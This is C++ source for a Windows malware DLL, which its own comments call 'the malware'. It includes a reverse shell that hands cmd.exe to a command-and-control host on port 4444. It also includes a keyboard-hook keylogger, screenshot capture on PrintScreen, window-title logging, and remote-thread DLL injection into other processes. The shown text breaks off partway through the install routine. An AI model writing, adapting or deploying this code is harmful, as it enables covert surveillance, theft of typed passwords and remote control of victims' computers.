#include "stdafx.h"
#include "crypto32.h"
#include "lookups.h"
#include "sha256.h"


/************************************************************* Global Variables *******************************************************/
// TODO: Set Last Boot Time as Salt
char* salt = "3.141592653589793238462643383279502884197169399375105820974944592307816406286";

char* C2_address = "<redacted>";

HWND hCurrentWindow = NULL;
HANDLE hfileMutex;

char logfilepath[MAX_PATH];
char ssFilePath[MAX_PATH];

/************************************************************** DLL Main *************************************************************/

BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved ){
	switch (ul_reason_for_call){
		case DLL_PROCESS_ATTACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}

/************************************************************* Utilities *************************************************************/

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	Function:	CaptureSS

	Summary:	Captures a screenshot and saves it under the path that's contained
				in the global variable ssFilePath

	Args:		None

	Returns:	void
-----------------------------------------------------------------F-F*/
void CaptureSS() {
	FILE *fBitmap;
	BITMAPFILEHEADER bmFileHeader;
	DIBSECTION dsResult;
	HDC hdcScreen = CreateDCA("DISPLAY", NULL, NULL, NULL);
	HDC hdcCapture = CreateCompatibleDC(hdcScreen);
	int nWidth = GetDeviceCaps(hdcScreen, HORZRES),
		nHeight = GetDeviceCaps(hdcScreen, VERTRES);

	LPBYTE lpCapture;
	BITMAPINFO bmiCapture = { {
			sizeof(BITMAPINFOHEADER), nWidth, nHeight, 1, 24, BI_RGB, 0, 0, 0, 0, 0,
		} };

	HBITMAP hbmCapture = CreateDIBSection(hdcScreen, &bmiCapture,
		DIB_RGB_COLORS, (LPVOID *)&lpCapture, NULL, 0);
	if (hbmCapture) {
		HBITMAP hbmOld = (HBITMAP)SelectObject(hdcCapture, hbmCapture);
		BitBlt(hdcCapture, 0, 0, nWidth, nHeight, hdcScreen, 0, 0, SRCCOPY);
		SelectObject(hdcCapture, hbmOld);
	}

	DeleteDC(hdcCapture);
	DeleteDC(hdcScreen);


	if (hbmCapture) {
		GetObject(hbmCapture, sizeof(DIBSECTION), &dsResult);
		fopen_s(&fBitmap, ssFilePath, "wb");
		if (fBitmap) {
			memset(&bmFileHeader, 0, sizeof(bmFileHeader));
			bmFileHeader.bfType = 'MB';
			bmFileHeader.bfOffBits = sizeof(bmFileHeader) + sizeof(dsResult.dsBmih);
			bmFileHeader.bfSize = bmFileHeader.bfOffBits +
				(dsResult.dsBm.bmWidthBytes * dsResult.dsBm.bmHeight);
			fwrite(&bmFileHeader, sizeof(bmFileHeader), 1, fBitmap);
			fwrite(&dsResult.dsBmih, sizeof(dsResult.dsBmih), 1, fBitmap);
			fwrite(dsResult.dsBm.bmBits, 1, dsResult.dsBmih.biSizeImage, fBitmap);
			fclose(fBitmap);
		}
		else {
			DEBUG_CODE(printf("Error: could not open ss filepath for write.\n");)
		}
		DeleteObject(hbmCapture);
	}
	else {
		DEBUG_CODE(printf("Error: failed to capture screen.\n");)
	}
}

// Various helper functions that collect info for GetMutexStr
void GetDesktopResolution(PDWORD horizontal, PDWORD vertical)
{
	RECT desktop;
	const HWND hDesktop = GetDesktopWindow();
	// Get the size of screen to the variable desktop
	GetWindowRect(hDesktop, &desktop);
	// The top left corner will have coordinates (0,0)
	// and the bottom right corner will have coordinates
	// (horizontal, vertical)
	*horizontal = desktop.right;
	*vertical = desktop.bottom;
}
void GetGPUDescription(char* dest) {
	IDirect3D9* pD3D9 = NULL;
	pD3D9 = Direct3DCreate9(D3D_SDK_VERSION);
	D3DADAPTER_IDENTIFIER9 id;
	if (pD3D9) {
		UINT dwAdapterCount = pD3D9->GetAdapterCount();
		for (UINT iAdapter = 0; iAdapter < dwAdapterCount; iAdapter++) {
			ZeroMemory(&id, sizeof(D3DADAPTER_IDENTIFIER9));
			pD3D9->GetAdapterIdentifier(iAdapter, 0, &id);
			if (strcmp(id.Description, ""))
				strncpy_s(dest, MAX_DEVICE_IDENTIFIER_STRING, id.Description, MAX_DEVICE_IDENTIFIER_STRING);
		}
	}
}
void GetCPUDescription(char* dest) {
	int cpuInfo[4];
	memset(dest, 0, sizeof(CPU_STR_SIZE));

	__cpuid(cpuInfo, 0x80000002);						//	Get Processor Brand String. 
														//	More Info: https://en.wikipedia.org/wiki/CPUID#EAX.3D80000002h.2C80000003h.2C80000004h:_Processor_Brand_String
	memcpy(dest, cpuInfo, sizeof(cpuInfo));

	__cpuid(cpuInfo, 0x80000003);
	memcpy(dest + 16, cpuInfo, sizeof(cpuInfo));

	__cpuid(cpuInfo, 0x80000004);
	memcpy(dest + 32, cpuInfo, sizeof(cpuInfo));

}
void sha256(char* source, char* dest) {

	unsigned char* hash = new unsigned char[32]();
	SHA256_CTX sha256;
	sha256_init(&sha256);
	sha256_update(&sha256, (PBYTE)source, strlen(source));			//	Actual data
	sha256_update(&sha256, (PBYTE)salt, strlen(salt));				//	Salt
	sha256_final(&sha256, hash);

	for (int i = 0; i < 32; i++)
		snprintf(dest + (i * 2), 256, "%02x", hash[i]); // Copy 2 bytes hex chars at a time
																//NUL- Terminating
	dest[64] = NULL;
	delete[] hash;
}

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	Function:	GetMutexStr

	Summary:	Obtains a string to be used as the mutex string.
				It is based on various hardware properties.
				Makes sure 2 instances of the malware are not running concurrently.

	Args:		char* dest
					A pointer to the caller's char array.
					This is where the produced string will be copied to.

	Returns:	void
-----------------------------------------------------------------F-F*/
void GetMutexStr(char* dest) {

	SYSTEM_INFO siSysInfo;
	HW_PROFILE_INFOA   HwProfInfo;
	DWORD dwHorizontalSize, dwVerticalSize, dwNumberOfProcessors;
	DWORD dwSize = MAX_COMP_NAME;
	DWORD bufCharCount = USERNAME_BUF;
	char* pComputerName = new char[MAX_COMPUTERNAME_LENGTH + 1]();
	char* pUserName = new char[USERNAME_BUF]();
	char* CPUBrandString = new char[CPU_STR_SIZE]();
	char* GPUDesc = new char[300]();
	char pHostStr[200];
	char* pMutexStr = new char[SHA256_DIGEST_LENGTH]();

	// Getting the Number of Processors
	GetSystemInfo(&siSysInfo);
	dwNumberOfProcessors = siSysInfo.dwNumberOfProcessors;

	// Get Computer Name
	GetComputerNameA(pComputerName, &dwSize);

	// Get Unique Hardware Profile GUID
	GetCurrentHwProfileA(&HwProfInfo);

	// Get Username
	GetUserNameA(pUserName, &bufCharCount);

	// Get Desktop Resolution
	GetDesktopResolution(&dwHorizontalSize, &dwVerticalSize);

	// CPU and GPU Descriptions
	GetCPUDescription(CPUBrandString);
	GetGPUDescription(GPUDesc);

	// Combine everything into one string
	snprintf(pHostStr, HOST_STR_SIZE, "%s%s%s%d%s%s", pComputerName, HwProfInfo.szHwProfileGuid, pUserName, dwHorizontalSize + dwVerticalSize, CPUBrandString, GPUDesc);
	
	// Hash that string
	sha256(pHostStr, pMutexStr);
	
	strncpy_s(dest, SHA256_DIGEST_LENGTH, pMutexStr, strlen(pMutexStr)+1);
	delete[] pComputerName;
	delete[] pUserName; 
	delete[] CPUBrandString; 
	delete[] pMutexStr;
	delete[] GPUDesc;
}

// Simple conversion from Wide-String to ANSI style String
char* UnicodeToAnsi(LPCWSTR source)
{
	DWORD dwSourceLen, dwBytesNeeded;
	dwSourceLen = lstrlenW(source);
	dwBytesNeeded = WideCharToMultiByte(CP_ACP, 0, source, dwSourceLen, NULL, 0, NULL, NULL);

	if (!dwBytesNeeded) return NULL;

	char *dest = new char[dwBytesNeeded + 1];
	dwBytesNeeded = WideCharToMultiByte(CP_ACP, 0, source, dwSourceLen, dest, dwBytesNeeded, NULL, NULL);
	if (!dwBytesNeeded) {
		delete[] dest;
		return NULL;
	}
	dest[dwBytesNeeded] = '\0';
	return dest;
}

/************************************************************ Reverse Shell **********************************************************/

DWORD WINAPI RunRShell(LPVOID lpParam) {
	WSADATA wsaData;
	int i = 0;
	struct sockaddr_in sockstruct;
	STARTUPINFOA sui;
	SOCKET sockt;
	PROCESS_INFORMATION pi;

	WSAStartup(MAKEWORD(2, 2), &wsaData);

	sockt = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
	sockstruct.sin_family = AF_INET;
	sockstruct.sin_port = htons(4444);
	sockstruct.sin_addr.s_addr = inet_addr(C2_address);

	// While Connection is unavailable, sleep for 10 sec and retry
	while ((WSAConnect(sockt, (SOCKADDR*)&sockstruct, sizeof(sockstruct), NULL, NULL, NULL, NULL) == SOCKET_ERROR) && (i < RSHELL_MAX_ATTEMPTS)) {
		Sleep(10000);
		i++;
	}

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)sockt;

	char commandLine[256] = "cmd.exe";
	CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
	
	DEBUG_CODE(MessageBoxA(0, "Rshell sleeping", "D", MB_OK););

	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	closesocket(sockt);
	return 0;
}

/************************************************************* KeyLogger *************************************************************/

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	Function:	CheckWindow

	Summary:	Checks if the foreground window has changed.
				If it was changed, update the global handle variable hCurrentWindow

	Args:		HWND hPrevForeWindow
					Contains the handle to the previous foreground window.

	Returns:	BOOL
					True if foreground window was change, False otherwise.
-----------------------------------------------------------------F-F*/
BOOL CheckWindow(HWND hPrevForeWindow) {
	HWND newforeground = GetForegroundWindow();
	if (!(newforeground == hPrevForeWindow)) {
		// HWNDs dont need to be destroyed explicitly
		hCurrentWindow = newforeground;
		return TRUE;
	}
	return FALSE;
}

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	Function:	WindowWatcher(Thread Function)

	Summary:	Periodically checks the current foreground window.
				If the window is changed, log it.

	Args:		LPVOID lpParameter
					Not Used.

	Returns:	DWORD
-----------------------------------------------------------------F-F*/
DWORD WINAPI WindowWatcher(LPVOID lpParameter) {
	FILE* file;
	DWORD dwWaitResult;

	while (TRUE) {
		if (CheckWindow(hCurrentWindow)) {
			char window_title[256], msg[320];
			GetWindowTextA(hCurrentWindow, window_title, 256);
			sprintf_s(msg, sizeof(msg), "\n================ Current Window Title: %s ================\n", window_title);

			// Wait on file mutex so we can open the file safely.
			dwWaitResult = WaitForSingleObject(hfileMutex, INFINITE);
			switch (dwWaitResult) {
			case WAIT_OBJECT_0:
				if (!fopen_s(&file, logfilepath, "a+")) {
					fputs(msg, file);
					fclose(file);
				}

				ReleaseMutex(hfileMutex);
				break;

			case WAIT_ABANDONED:
				ExitThread(0);
			}
		}
		// Sleep in interruptible mode. if APC is attached, the thread will terminate
		SleepEx(3000, TRUE);
	}
}

// Simple APC function that terminates the executing thread
VOID CALLBACK KillWwatcher(ULONG_PTR dwParam) {
	ExitThread(0);
}

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	Function:	InstallHook (Thread Function)

	Summary:	Plugs in the WH_KEYBOARD_LL hook and registers a HotKey that stops the Keylogger

	Args:		LPVOID lpParameter
					Pointer to the Window Watcher's HANDLE.
					This is used to kill the Window Watcher Thread when the HotKey is pressed

	Returns:	DWORD
-----------------------------------------------------------------F-F*/
DWORD WINAPI InstallHook(LPVOID lpParameter) {
	HHOOK hKeyHook;
	HANDLE hwindowT = *((HANDLE*)lpParameter);
	HINSTANCE hExe = GetModuleHandle(NULL);

	DEBUG_CODE(MessageBoxA(0, "Entering Installhook", "D", MB_OK););
	if (!hExe) 
		return 1;
	else {
		hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hExe, 0);
		
		// Register a HotKey to kill the Keylogger ( Ctrl + Alt + 1 )
		RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL, 0x31);			

		DEBUG_CODE(MessageBoxA(0, "Installed Hook and Hotkey...","D",MB_OK);)
		MSG msg;
		while (GetMessage(&msg, NULL, 0, 0) != 0)
		{
			// if Hot key combination is pressed then exit
			if (msg.message == WM_HOTKEY)
			{
				UnhookWindowsHookEx(hKeyHook);// Unhook the WH_KEYBOARD_LL
				QueueUserAPC(KillWwatcher, hwindowT, NULL);	// When WindowWatcher goes to sleep, kill it
				return 0;
			}
			//Translates virtual-key messages into character messages. 
			TranslateMessage(&msg);
			//Dispatches a message to a window procedure.
			DispatchMessage(&msg);
		}

		QueueUserAPC(KillWwatcher, hwindowT, NULL);
		UnhookWindowsHookEx(hKeyHook);
	}
	return 0;

}

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	Function:	LogToFile

	Summary:	Logs the pressed key to the log file

	Args:		char* source
					Pointer to a buffer that contains the pressed key's verbose string

	Returns:  void
-----------------------------------------------------------------F-F*/
void LogToFile(char* source) {
	DWORD dwWaitResult;
	FILE* file;

	dwWaitResult = WaitForSingleObject(hfileMutex, INFINITE);
	switch (dwWaitResult) {

	case WAIT_OBJECT_0:
		if (!fopen_s(&file, logfilepath, "a+")) {
			fputs(source, file);
			fclose(file);
		}
		ReleaseMutex(hfileMutex);
		break;

	case WAIT_ABANDONED:
		ExitThread(0);
	}
}

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	Function:	LowLevelKeyboardProc

	Summary:	An application-defined or library-defined callback function used with the SetWindowsHookEx function.
				The system calls this function every time a new keyboard input event is about to be posted into a thread input queue.

	Args:		int nCode
					A code the hook procedure uses to determine how to process the message.
				WPARAM wParam
					The identifier of the keyboard message.
					This parameter can be one of the following messages: WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, or WM_SYSKEYUP.
				LPARAM lParam
					A pointer to a KBDLLHOOKSTRUCT structure.
	
	Returns:  KBDLLHOOKSTRUCT
			Contains information about a low-level keyboard input event.
-----------------------------------------------------------------F-F*/
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
	char val[5];

	switch (wParam) {
		case WM_KEYDOWN:
		{
			DWORD vkCode = pKeyBoard->vkCode;
			if ((vkCode >= 0x30) && (vkCode <= 0x39)) { // Numbers 0-9 or their corresponding (shifted) symbols
				if (GetAsyncKeyState(VK_SHIFT)) {
					LookupCode(&VK_LUT_ucase, vkCode);
				}
				else {
					sprintf_s(val, sizeof(val), "%c", vkCode);
					LogToFile(val);
				}
			}
			else if ((vkCode > 0x40) && (vkCode < 0x5B)) { // keys a-z
				/*
				*	Used XOR between SHIFT key press and CAPSLOCK.
				*	If both are pressed (or not pressed) at the same time
				*	then we don't need to convert to uppercase
				**/
				if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock()))
					vkCode += 32; // Convert to uppercase
				sprintf_s(val, sizeof(val), "%c", vkCode);
				LogToFile(val);
			}
			else {
				// if the user presses PrntScrn, take a snapshot
				if (vkCode == VK_SNAPSHOT)
					CaptureSS();
				else if ((vkCode >= VK_OEM_1) && (vkCode <= VK_OEM_7)) {
					if (GetAsyncKeyState(VK_SHIFT))
						LookupCode(&VK_LUT_ucase, vkCode);
				}
				else if (!((vkCode == VK_LSHIFT) || (vkCode == VK_RSHIFT))) // if it's RSHIFT or LSHIFT do nothing
					LookupCode(&VK_LUT_lcase, vkCode);
			}
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	Function:	LookupCode

	Summary:	Looks up the given VK_CODE in the static lookup tables

	Args:		unordered_map<int, char*>* table
					Pointer to the right lookup table
				int Code
					The VK_CODE we are looking up

	Returns:	void
-----------------------------------------------------------------F-F*/
void LookupCode(unordered_map<int, char*>* table, int Code) {
	auto finding = (*table).find(Code);
	if (finding != (*table).end())
		LogToFile(finding->second);
}

// Checks if capslock is pressed
int isCapsLock() {
	return (GetKeyState(VK_CAPITAL) & 0x0001);
}

/************************************************************** Injector *************************************************************/

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	Function:	FindTargetProcess

	Summary:	Finds the target process and attempts to inject.
				If the procedure fails, it finds another one.

	Args:		char* Target
					Contains the Target's Executable Name. Can be NULL
				char* pLibPath
					Contains the absolute path of the DLL to be injected
	Returns:	BOOL isWin32
					Indicated if the machine's OS is 32 or 64 bit.
-----------------------------------------------------------------F-F*/
BOOL FindTargetProcess(char* Target, char* pLibPath, BOOL isWin32) {
	char* ExeName = NULL;
	char* bit = new char[250]();
	HANDLE hProcess;
	BOOL isWow64, is32bit;
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		DEBUG_CODE(MessageBoxA(0, "Failed Getting Snapshot ", "D", MB_ICONERROR);)
		return FALSE;
	}

	// Set the size of the structure before using it.
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if (!Process32First(hProcessSnap, &pe32))
	{
		DEBUG_CODE(MessageBoxA(0, "Failed getting next snapshot", "D", MB_ICONERROR);) // show cause of failure
		goto failed;          // clean the snapshot object
	}

	// Now walk the snapshot of processes, and
	// find a target
	do
	{
		is32bit = FALSE;
		// Convert WCHAR* to char*
		// UnicodeToAnsi Allocates the needed bytes in Heap
		if ((ExeName = UnicodeToAnsi(pe32.szExeFile)) && !ExeName) {
			DEBUG_CODE(MessageBoxA(0, "Failed to Convert To ANSI", "D", MB_ICONERROR););
			goto failed;
		}
		
		hProcess = OpenProcess(			// We could open the target process with privileged access here
			PROCESS_QUERY_INFORMATION,	// But it is important to find out if it is 32 or 64 bit process
			FALSE, pe32.th32ProcessID);

		if (hProcess)
		{																					// If isWin32 is set, then the OS is 32bit so we don't have to check if the process is 32bit.
			if (isWin32 || (IsWow64Process(hProcess, &isWow64) && isWow64)) is32bit = TRUE;	// Otherwise call IsWow64Process and check if isWow64 set.

			is32bit ? strncpy_s(bit, 250, "32Bit", 6) : strncpy_s(bit, 250, "64Bit", 6);
		}
		else
			strncpy_s(bit, 250, "Access Denied", 15);

		//printf("[%s] %-40s (PID: %-5u) \t%s \n", __func__, ExeName, pe32.th32ProcessID, bit);
		
		if (is32bit && (!Target || (Target && (_stricmp(ExeName, Target) == 0)))) {
			CloseHandle(hProcess);

			//Open Process with Privileged Access
			hProcess = OpenProcess(
				PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ |
				PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
				FALSE,
				pe32.th32ProcessID);
			if (!hProcess) {
				// If the needed Access is not provided, look for another target
				DEBUG_CODE(MessageBoxA(0, "Opening Target Process Failed With Code...", "D", MB_ICONERROR);)
				continue;
			}

			DEBUG_CODE(MessageBoxA(0, "Target ExeName", ExeName, MB_OK););
			if (inject(pLibPath, hProcess)) {
				CloseHandle(hProcessSnap);
				CloseHandle(hProcess);
				delete[] bit;
				delete[] ExeName;
				return TRUE;
			}
		}
	} while (Process32Next(hProcessSnap, &pe32));
failed:
	CloseHandle(hProcessSnap);
	delete[] bit;
	delete[] ExeName;
	return FALSE;
}

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	Function:	Inject

	Summary:	Injects the DLL into the candidate target.
				For more information, check README

	Args:		char* pLibPath
					Contains the absolute path of the DLL to inject
				HANDLE hTarget
					a HANDLE to the opened Target process
	Returns:	BOOL
					Indicated if injection was successful.
-----------------------------------------------------------------F-F*/
BOOL inject(char* pLibPath, HANDLE hTarget) {
	LPVOID baseAddress = NULL, RemoteLoadLibraryA;
	HANDLE hRemoteThread;
	HMODULE hInjected;

	//Allocate space to inject the path string
	baseAddress = VirtualAllocEx(hTarget, NULL, MAX_PATH, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!baseAddress) {
		DEBUG_CODE(MessageBoxA(0,"Failed to allocate space in target process..." , "D", MB_ICONERROR);)
		goto failed;
	}

	// Write the DLL's Path String to the Remote Process
	if (!WriteProcessMemory(hTarget, baseAddress, pLibPath, MAX_PATH, NULL)) {
		DEBUG_CODE(MessageBoxA(0, "Failed to write the final path to the target process...", "D", MB_ICONERROR);)
		goto failed;
	}
	RemoteLoadLibraryA = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

	// Start Remote Thread That Loads the DLL to be Injected
	hRemoteThread = CreateRemoteThread(hTarget, NULL, NULL, (LPTHREAD_START_ROUTINE)RemoteLoadLibraryA, baseAddress, NULL, NULL);
	if (!hRemoteThread) {
		DEBUG_CODE(MessageBoxA(0, "Failed to create the remote thread...", "D", MB_ICONERROR);)
		goto failed;
	}
		
	// Wait for the Virtual Address, where our injected lib was loaded.
	WaitForSingleObject(hRemoteThread, INFINITE);

	if (!GetExitCodeThread(hRemoteThread, (LPDWORD)&hInjected) || ( hInjected == NULL)) {
		CloseHandle(hRemoteThread);
		DEBUG_CODE(MessageBoxA(0, "FAILED to Load Libray", "Debug", MB_ICONERROR););
		goto failed;
	}
	CloseHandle(hRemoteThread);
	if (InitPayload(hTarget, pLibPath, hInjected)){
		DEBUG_CODE(MessageBoxA(0, "Successfully Injected", "Debug", MB_OK););
	}
	else {
		DEBUG_CODE(MessageBoxA(0, "FAILED to Inject", "D", MB_ICONERROR););
		goto failed;
	}
	VirtualFreeEx(hTarget, baseAddress, 0, MEM_RELEASE);
	CloseHandle(hTarget);
	return TRUE;

failed:
	VirtualFreeEx(hTarget, baseAddress, 0, MEM_RELEASE);
	CloseHandle(hTarget);
	return FALSE;
}

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	Function:	InitPayload

	Summary:	Obtains the Exported Function's Virtual Address and executes it in the remote process.
				The Virtual Address is in the context of the remote process.

	Args:		HANDLE hProcess
					A HANDLE to the remote/target process
				char* lpDLLPath
					The Absolute Path of the DLL to be injected
				HMODULE hPayloadBase
					This is the base address, where the DLL was injected.
					It was returned by the CreateRemoteThread that loaded the DLL.

	Returns:	BOOL
					
-----------------------------------------------------------------F-F*/
BOOL InitPayload(HANDLE hProcess, char* lpDLLPath, HMODULE hPayloadBase) {
	void* lpInit = (void*)GetExpFuncVA(lpDLLPath, hPayloadBase, TRUE, NULL , 0);
	if (lpInit) {
		if (CreateRemoteThread(hProcess, NULL, 0,
			(LPTHREAD_START_ROUTINE)lpInit, NULL, 0, NULL))
			return TRUE;
	}
	return FALSE;
}

/*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	Function:	GetExpFuncVA

	Summary:	Maps an Executable/DLL into Memory using the File Mapping API.
				Then tries to find an Exported function by Name, Ordinal or Index.

	Args:		char* pExeAbsPath
					The Executable's Absolute Path.
				HMODULE hPayloadBase
					This is the base address where the injected DLL is loaded in the remote/target proccess.
				BOOL bExactIndex
					If this variable is TRUE, then wTargetOrdinal contains the exact index 
					of the target exported function in the Exe's PE Header's AddressFunction table
				char* pExportFuncName
					The Target Function's Name.
				WORD wTargetOrdinal
					Contains the Target Function's Ordinal Number or its direct index.

	Returns:	PDWORD
					A pointer to a DWORD that contains the VA of the Exported Function in the Target Process' Virtual Memory
-----------------------------------------------------------------F-F*/
PVOID GetExpFuncVA(char* pExeAbsPath, HMODULE hPayloadBase, BOOL bExactIndex, char* pExportFuncName, WORD wTargetOrdinal) {
	PIMAGE_DOS_HEADER pDosHeader;
	PIMAGE_NT_HEADERS pNtHeaders;
	PIMAGE_EXPORT_DIRECTORY pExDir;
	HANDLE hFile, hFileMap;
	LPVOID lpFile;
	PVOID ret = NULL;

	hFile = CreateFileA(pExeAbsPath, GENERIC_READ, FILE_SHARE_READ, 0,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hFile == INVALID_HANDLE_VALUE) {
		DEBUG_CODE(MessageBoxA(0, "Could Not Open File At %s . Last Error: %d \n", "D", MB_ICONERROR);)
		return NULL;
	}

	hFileMap = CreateFileMapping(hFile, 0, PAGE_READONLY | SEC_IMAGE, 0, 0, 0);
	lpFile = MapViewOfFile(hFileMap, FILE_MAP_READ, 0, 0, 0);
	pDosHeader = (PIMAGE_DOS_HEADER)lpFile;
	pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)lpFile + pDosHeader->e_lfanew);
	pExDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)(lpFile)+pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PBYTE basePointer = (PBYTE)lpFile;
	PDWORD FuncAddrs = (PDWORD)(basePointer + pExDir->AddressOfFunctions);
	
	//	If bExactIndex is TRUE, 
	//	then the wTargetOrdinal contains the actual index of the Target Function (in Function Address Array)
	if (bExactIndex) {
		ret = (PVOID)(FuncAddrs[wTargetOrdinal] + (DWORD)hPayloadBase);
		goto cleanup;
	}

	PDWORD NameAddrs = (PDWORD)(basePointer + pExDir->AddressOfNames);
	PWORD Ords = (PWORD)(basePointer + pExDir->AddressOfNameOrdinals);

	if (pExportFuncName) {
		for (WORD x = 0; x < pExDir->NumberOfFunctions; x++) {
			char* pFuncName = (char*)(basePointer + NameAddrs[x]);
			WORD wOrdinal = pExDir->Base + Ords[x];
			WORD wIndex = wOrdinal - pExDir->Base;
			if (strcmp(pExportFuncName, pFuncName) == 0) {
				ret = (PVOID)(FuncAddrs[wIndex] + (DWORD)hPayloadBase);
				goto cleanup;

			}
		}
	}
	else {
		for (WORD x = 0; x < pExDir->NumberOfFunctions; x++) {
			WORD wOrdinal = pExDir->Base + Ords[x];
			if (wOrdinal == wTargetOrdinal) {
				WORD wIndex = wOrdinal - pExDir->Base;
				ret = (PVOID)(FuncAddrs[wIndex] + (DWORD)hPayloadBase);
				goto cleanup;
			}
		}
	}

cleanup:
	UnmapViewOfFile(lpFile);
	CloseHandle(hFileMap);
	return ret;

}

// An alternative to the GetExpFuncVA function, only this one actually loads the library and calls GetProcAddress
PVOID GetPayloadExportAddr(char* lpPath, HMODULE hPayloadBase, LPCSTR lpFunctionName) {
	HMODULE hLoaded = LoadLibraryA(lpPath);

	if (hLoaded) {
		void* lpFunc = GetProcAddress(hLoaded, lpFunctionName);
		DWORD dwOffset = (char*)lpFunc - (char*)hLoaded;
		FreeLibrary(hLoaded);
		return (void*)((DWORD)hPayloadBase + dwOffset);
	}
	return NULL;
}

/********************************************************** Exported Functions *******************************************************/

/*F+F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F
	Function: PayLoad

	Summary:	Contains the actualy payload of the malware.
				For more information, check repo's README

	Args:		None

	Returns:  void
F---F---F---F---F---F---F---F---F---F---F---F---F---F---F---F---F-F*/
void PayLoad() {
	BOOL bAlreadyRunning;
	DWORD ExitCode;
	HANDLE hGlobalMutex, hKeyLogT, hRshellT, hwindowT;
	HANDLE hHandles[2];
	char* pMutexStr = new char[SHA256_DIGEST_LENGTH];

	DEBUG_CODE(MessageBoxA(0, "Entering Payload", "D", MB_OK););

	ExpandEnvironmentStringsA("%TEMP%\\key.log", logfilepath, MAX_PATH);
	ExpandEnvironmentStringsA("%TEMP%\\ss.bmp", ssFilePath, MAX_PATH);

	GetMutexStr(pMutexStr);
	
	SetLastError(0);
	hGlobalMutex = CreateMutexA(
		NULL,
		TRUE,
		pMutexStr		// Create a pseudorandom mutex name, based on host's hardware, MAC address, etc.
	);
	delete[] pMutexStr;
	bAlreadyRunning = (GetLastError() == ERROR_ALREADY_EXISTS);
	if (bAlreadyRunning)
	{
		DEBUG_CODE(MessageBoxA(0, "Error", "Another Instance is Already Running", MB_ICONERROR););
		return;
	}
	hfileMutex = CreateMutex(NULL, FALSE, NULL);
	hRshellT = CreateThread(NULL, 0, RunRShell, NULL, NULL, NULL);
	hwindowT = CreateThread(NULL, 0, WindowWatcher, NULL, 0, NULL);
	hKeyLogT = CreateThread(NULL, 0, InstallHook, &hwindowT, 0, NULL);

	hHandles[0] = hKeyLogT;
	hHandles[1] = hRshellT;

	WaitForMultipleObjectsEx(
		2,			// Number of objects to wait for
		hHandles,	// Array of handles to the objects we are waiting for
		TRUE,		// Wait for ALL objects to get signaled
		INFINITE,	// Time in milliseconds to wait for
		TRUE
	);

	//Cleanup
	ReleaseMutex(hGlobalMutex);
	CloseHandle(hKeyLogT);
	GetExitCodeThread(hwindowT, &ExitCode);
	CloseHandle(hwindowT);
	CloseHandle(hfileMutex);
	CloseHandle(hGlobalMutex);
}

/*F+F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F
	Function:	Install

	Summary:	Finds a target process and attempts to inject it.
				If injection fails, it looks for another one.
				Note: A target's .exe name could be given as an input instead.
				For more information, check repo's README

	Args:		LPWSTR lpszCmdLine
					Contains the target's .exe name.

	Returns:  void
F---F---F---F---F---F---F---F---F---F---F---F---F---F---F---F---F-F*/
void Install(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow) {
	char SysWow64Dir[MAX_PATH];
	char pLibPath[MAX_PATH];
	BOOL isWin32 = TRUE;
	char* Target = NULL;

	if (wcscmp(lpszCmdLine, L"")) {
		Target = new char[MAX_PATH]();
		size_t num;
		wcstombs_s(&num, Target, MAX_PATH, lpszCmdLine, MAX_PATH);
		DEBUG_CODE(MessageBoxA(0, Target, "Debug", MB_OK);)
	}

	// Build DLL's Path
	ExpandEnvironmentStringsA("%TEMP%\\crypto32.dll", pLibPath, MAX_PATH);
